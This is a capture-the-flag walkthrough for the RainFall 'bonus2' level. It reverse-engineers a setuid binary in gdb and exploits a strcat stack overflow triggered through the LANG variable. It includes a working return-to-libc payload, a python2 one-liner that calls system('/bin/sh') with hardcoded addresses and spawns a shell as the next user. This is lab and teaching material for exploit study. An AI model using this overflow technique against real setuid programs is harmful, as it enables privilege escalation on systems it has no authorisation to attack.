# Walkthrough

So, after connecting with the `bonus2` user, I found a binary file called `bonus2`. I executed it to see its behavior.

```
bonus2@RainFall:~$ ./bonus2 AAAA
bonus2@RainFall:~$ ./bonus2 AAAA BBBB
Hello AAAA
```

 To better understand how it works, I used objdump to check if it had any global variables, and then I debugged it with `gdb`.

 ```sh
bonus2@RainFall:~$ objdump -t ./bonus2 | grep .bss
08049980 l    d  .bss 00000000              .bss
08049980 l     O .bss 00000001              completed.6159
08049984 l     O .bss 00000004              dtor_idx.6161
08049980 g       *ABS* 00000000              __bss_start
08049988 g     O .bss 00000004              language

 ```

  First, I looked for all the functions contained in the binary file and disassembled the `main` function.

  ```s
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048318  _init
0x08048360  memcmp
0x08048360  memcmp@plt
0x08048370  strcat
0x08048370  strcat@plt
0x08048380  getenv
0x08048380  getenv@plt
0x08048390  puts
0x08048390  puts@plt
0x080483a0  __gmon_start__
0x080483a0  __gmon_start__@plt
0x080483b0  __libc_start_main
0x080483b0  __libc_start_main@plt
0x080483c0  strncpy
0x080483c0  strncpy@plt
0x080483d0  _start
0x08048400  __do_global_dtors_aux
0x08048460  frame_dummy
0x08048484  greetuser
0x08048529  main
0x08048640  __libc_csu_init
0x080486b0  __libc_csu_fini
0x080486b2  __i686.get_pc_thunk.bx
0x080486c0  __do_global_ctors_aux
0x080486ec  _fini
  ```
  
  The `main` function checked if the number of arguments was three. If it wasn't, the program exited. If it was, the function continued by clearing the buffer. Then, it used `strncpy` to copy 40 bytes from `argv[1]` to the buffer and another `strncpy` to copy 32 bytes from `argv[2]` to buffer + 40. After that, it searched for the `LANG` key in the environment variable using `getenv`. If it was `NULL`, the `greetuser` function was called with the buffer as a parameter. If not, it compared the first 2 bytes of the value returned from `getenv` using `memcmp`. If they were equal to `"fi"`, it changed the value of the language variable to `1`. If they were equal to `"nl"`, it changed the value of the language variable to `2`. Then, it called the `greetuser` function with the buffer as a parameter.

 ```s
(gdb) disas main
Dump of assembler code for function main:
   0x08048529 <+0>: push   ebp
   0x0804852a <+1>: mov    ebp,esp
   0x0804852c <+3>: push   edi
   0x0804852d <+4>: push   esi
   0x0804852e <+5>: push   ebx
   0x0804852f <+6>: and    esp,0xfffffff0
   0x08048532 <+9>: sub    esp,0xa0
   0x08048538 <+15>: cmp    DWORD PTR [ebp+0x8],0x3
   0x0804853c <+19>: je     0x8048548 <main+31>
   0x0804853e <+21>: mov    eax,0x1
   0x08048543 <+26>: jmp    0x8048630 <main+263>
   0x08048548 <+31>: lea    ebx,[esp+0x50]
   0x0804854c <+35>: mov    eax,0x0
   0x08048551 <+40>: mov    edx,0x13
   0x08048556 <+45>: mov    edi,ebx
   0x08048558 <+47>: mov    ecx,edx
   0x0804855a <+49>: rep stos DWORD PTR es:[edi],eax
   0x0804855c <+51>: mov    eax,DWORD PTR [ebp+0xc]
   0x0804855f <+54>: add    eax,0x4
   0x08048562 <+57>: mov    eax,DWORD PTR [eax]
   0x08048564 <+59>: mov    DWORD PTR [esp+0x8],0x28
   0x0804856c <+67>: mov    DWORD PTR [esp+0x4],eax
   0x08048570 <+71>: lea    eax,[esp+0x50]
   0x08048574 <+75>: mov    DWORD PTR [esp],eax
   0x08048577 <+78>: call   0x80483c0 <strncpy@plt>
   0x0804857c <+83>: mov    eax,DWORD PTR [ebp+0xc]
   0x0804857f <+86>: add    eax,0x8
   0x08048582 <+89>: mov    eax,DWORD PTR [eax]
   0x08048584 <+91>: mov    DWORD PTR [esp+0x8],0x20
   0x0804858c <+99>: mov    DWORD PTR [esp+0x4],eax
   0x08048590 <+103>: lea    eax,[esp+0x50]
   0x08048594 <+107>: add    eax,0x28
   0x08048597 <+110>: mov    DWORD PTR [esp],eax
   0x0804859a <+113>: call   0x80483c0 <strncpy@plt>
   0x0804859f <+118>: mov    DWORD PTR [esp],0x8048738
   0x080485a6 <+125>: call   0x8048380 <getenv@plt>
   0x080485ab <+130>: mov    DWORD PTR [esp+0x9c],eax
   0x080485b2 <+137>: cmp    DWORD PTR [esp+0x9c],0x0
   0x080485ba <+145>: je     0x8048618 <main+239>
   0x080485bc <+147>: mov    DWORD PTR [esp+0x8],0x2
   0x080485c4 <+155>: mov    DWORD PTR [esp+0x4],0x804873d
   0x080485cc <+163>: mov    eax,DWORD PTR [esp+0x9c]
   0x080485d3 <+170>: mov    DWORD PTR [esp],eax
   0x080485d6 <+173>: call   0x8048360 <memcmp@plt>
   0x080485db <+178>: test   eax,eax
   0x080485dd <+180>: jne    0x80485eb <main+194>
   0x080485df <+182>: mov    DWORD PTR ds:0x8049988,0x1
   0x080485e9 <+192>: jmp    0x8048618 <main+239>
   0x080485eb <+194>: mov    DWORD PTR [esp+0x8],0x2
   0x080485f3 <+202>: mov    DWORD PTR [esp+0x4],0x8048740
   0x080485fb <+210>: mov    eax,DWORD PTR [esp+0x9c]
   0x08048602 <+217>: mov    DWORD PTR [esp],eax
   0x08048605 <+220>: call   0x8048360 <memcmp@plt>
   0x0804860a <+225>: test   eax,eax
   0x0804860c <+227>: jne    0x8048618 <main+239>
   0x0804860e <+229>: mov    DWORD PTR ds:0x8049988,0x2
   0x08048618 <+239>: mov    edx,esp
   0x0804861a <+241>: lea    ebx,[esp+0x50]
   0x0804861e <+245>: mov    eax,0x13
   0x08048623 <+250>: mov    edi,edx
   0x08048625 <+252>: mov    esi,ebx
   0x08048627 <+254>: mov    ecx,eax
   0x08048629 <+256>: rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   0x0804862b <+258>: call   0x8048484 <greetuser>
   0x08048630 <+263>: lea    esp,[ebp-0xc]
   0x08048633 <+266>: pop    ebx
   0x08048634 <+267>: pop    esi
   0x08048635 <+268>: pop    edi
   0x08048636 <+269>: pop    ebp
   0x08048637 <+270>: ret    
End of assembler dump.
 ```
  
  The `greetuser` function started by checking the value of the language global variable. If it was `zero`, it filled the buffer with `"Hello "`. If it was `1`, it filled the buffer with `"Hyvää päivää "`. If it was `2`, it filled the buffer with `"Goedemiddag! "`. Then, it concatenated the buffer with the parameter passed to the function using `strcat` and displayed the buffer using `puts`.

  ```c
(gdb) disas greetuser 
Dump of assembler code for function greetuser:
   0x08048484 <+0>: push   ebp
   0x08048485 <+1>: mov    ebp,esp
   0x08048487 <+3>: sub    esp,0x58
   0x0804848a <+6>: mov    eax,ds:0x8049988
   0x0804848f <+11>: cmp    eax,0x1
   0x08048492 <+14>: je     0x80484ba <greetuser+54>
   0x08048494 <+16>: cmp    eax,0x2
   0x08048497 <+19>: je     0x80484e9 <greetuser+101>
   0x08048499 <+21>: test   eax,eax
   0x0804849b <+23>: jne    0x804850a <greetuser+134>
   0x0804849d <+25>: mov    edx,0x8048710 // "Hello "
   0x080484a2 <+30>: lea    eax,[ebp-0x48]
   0x080484a5 <+33>: mov    ecx,DWORD PTR [edx]
   0x080484a7 <+35>: mov    DWORD PTR [eax],ecx
   0x080484a9 <+37>: movzx  ecx,WORD PTR [edx+0x4]
   0x080484ad <+41>: mov    WORD PTR [eax+0x4],cx
   0x080484b1 <+45>: movzx  edx,BYTE PTR [edx+0x6]
   0x080484b5 <+49>: mov    BYTE PTR [eax+0x6],dl
   0x080484b8 <+52>: jmp    0x804850a <greetuser+134>
   0x080484ba <+54>: mov    edx,0x8048717 // "Hyvää päivää "
   0x080484bf <+59>: lea    eax,[ebp-0x48]
   0x080484c2 <+62>: mov    ecx,DWORD PTR [edx]
   0x080484c4 <+64>: mov    DWORD PTR [eax],ecx
   0x080484c6 <+66>: mov    ecx,DWORD PTR [edx+0x4]
   0x080484c9 <+69>: mov    DWORD PTR [eax+0x4],ecx
   0x080484cc <+72>: mov    ecx,DWORD PTR [edx+0x8]
   0x080484cf <+75>: mov    DWORD PTR [eax+0x8],ecx
   0x080484d2 <+78>: mov    ecx,DWORD PTR [edx+0xc]
   0x080484d5 <+81>: mov    DWORD PTR [eax+0xc],ecx
   0x080484d8 <+84>: movzx  ecx,WORD PTR [edx+0x10]
   0x080484dc <+88>: mov    WORD PTR [eax+0x10],cx
   0x080484e0 <+92>: movzx  edx,BYTE PTR [edx+0x12]
   0x080484e4 <+96>: mov    BYTE PTR [eax+0x12],dl
   0x080484e7 <+99>: jmp    0x804850a <greetuser+134>
   0x080484e9 <+101>: mov    edx,0x804872a // "Goedemiddag! "
   0x080484ee <+106>: lea    eax,[ebp-0x48]
   0x080484f1 <+109>: mov    ecx,DWORD PTR [edx]
   0x080484f3 <+111>: mov    DWORD PTR [eax],ecx
   0x080484f5 <+113>: mov    ecx,DWORD PTR [edx+0x4]
   0x080484f8 <+116>: mov    DWORD PTR [eax+0x4],ecx
   0x080484fb <+119>: mov    ecx,DWORD PTR [edx+0x8]
   0x080484fe <+122>: mov    DWORD PTR [eax+0x8],ecx
   0x08048501 <+125>: movzx  edx,WORD PTR [edx+0xc]
   0x08048505 <+129>: mov    WORD PTR [eax+0xc],dx
   0x08048509 <+133>: nop
   0x0804850a <+134>: lea    eax,[ebp+0x8]
   0x0804850d <+137>: mov    DWORD PTR [esp+0x4],eax
   0x08048511 <+141>: lea    eax,[ebp-0x48]
   0x08048514 <+144>: mov    DWORD PTR [esp],eax
   0x08048517 <+147>: call   0x8048370 <strcat@plt>
   0x0804851c <+152>: lea    eax,[ebp-0x48]
   0x0804851f <+155>: mov    DWORD PTR [esp],eax
   0x08048522 <+158>: call   0x8048390 <puts@plt>
   0x08048527 <+163>: leave  
   0x08048528 <+164>: ret   
  ```

I am going to set a breakpoint after the `strcat` function in the `greetuser<152>` function, and then run the program using the following arguments.

```
r AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ aaaabbbbccccddddeeeeffffgggghhhh
```

Since I know that the first `strncpy` function in the main function only copies 40 characters, I filled the first argument with 40 characters. Similarly, since the second `strncpy` function only copies 32 characters, I used 32 characters in the second argument.

```s
------------ stack ------------
0xbffff4d0: 0xbffff4e0 0xbffff530 0x00000001 0x00000000
0xbffff4e0: 0x6c6c6548 0x4141206f 0x42424141 0x43434242
0xbffff4f0: 0x44444343 0x45454444 0x46464545 0x47474646
0xbffff500: 0x48484747 0x49494848 0x4a4a4949 0x61614a4a
0xbffff510: 0x62626161 0x63636262 0x64646363 0x65656464
0xbffff520: 0x66666565 0x67676666 0x68686767 0x08006868
0xbffff530: 0x41414141 0x42424242 0x43434343 0x44444444
------------ EBP ------------
(gdb) x/wx $ebp
0xbffff528: 0x68686767
------------ Return value ------------
(gdb) x/wx $ebp + 0x4
0xbffff52c: 0x08006868
```

Upon examining the program output, it appears that the return value is overwritten with the value `6868`, which corresponds to `"hh"`. However, I was unable to fully overwrite the return value, so I did not achieve any meaningful results. I then decided to inspect the buffer and noticed that if we change the `LANG` environment variable to `"fi"`, the parameter passed to the `greetuser` function and concatenated with the greetuser buffer could potentially move by some bytes, as the length of the buffer resulting from `"fi"` is greater than the default buffer length. So, I decided to test this theory by modifying the `LANG` environment variable.

```
------------ stack ------------
0xbffff4d0: 0xbffff4e0 0xbffff530 0x00000001 0x00000000
0xbffff4e0: 0xc3767948 0x20a4c3a4 0x69a4c370 0xc3a4c376
0xbffff4f0: 0x414120a4 0x42424141 0x43434242 0x44444343
0xbffff500: 0x45454444 0x46464545 0x47474646 0x48484747
0xbffff510: 0x49494848 0x4a4a4949 0x61614a4a 0x62626161
0xbffff520: 0x63636262 0x64646363 0x65656464 0x66666565
0xbffff530: 0x67676666 0x68686767 0x43006868 0x44444444
------------ EBP ------------
(gdb) x/wx $ebp
0xbffff528: 0x65656464
------------ Return value ------------
(gdb) x/wx $ebp + 0x4
0xbffff52c: 0x66666565
------------ EBP + 0xc ------------
(gdb) x/wx $ebp + 0xc
0xbffff534: 0x68686767
```

It appears that the plan worked as intended, as we can observe that the entire return value has been overwritten along with `$EBP+0xc`. The rationale behind changing `$EBP+0xc` is that it allows us to redirect the control flow to a new address of the `system` function while passing the `"/bin/sh"` parameter.

To complete the exploit, we just need to replace the value `0x66666565` (which is equivalent to `"eeff"`) in the buffer with the address of the `system` function `(0xb7e6b060)`, and replace the value `0x68686767` (which is equivalent to `"gghh"`) with the address of the string `"/bin/sh"` `(0xb7f8cc58)`. [Here are the steps to find the address of system() and /bin/sh](/level2/walkthrough.md).

I will now generate a string using Python, which will be passed as the second argument to the `bonus2` binary.

```sh
bonus2@RainFall:~$ ./bonus2 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ `python2 -c 'print("aaaabbbbccccddddee" + "\xb7\xe6\xb0\x60"[::-1] + "ffgg" + "\xb7\xf8\xcc\x58"[::-1] + "hh" )'`
Hyvää päivää AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJaaaabbbbccccddddee`��ffggX���hh
$ whoami
bonus3
$ cd ../bonus3
$ ls -la
total 17
dr-xr-x---+ 1 bonus3 bonus3   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 bonus3 bonus3  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 bonus3 bonus3 3530 Sep 23  2015 .bashrc
-rw-r--r--+ 1 bonus3 bonus3   65 Sep 23  2015 .pass
-rw-r--r--  1 bonus3 bonus3  675 Apr  3  2012 .profile
-rwsr-s---+ 1 end    users  5595 Mar  6  2016 bonus3
```
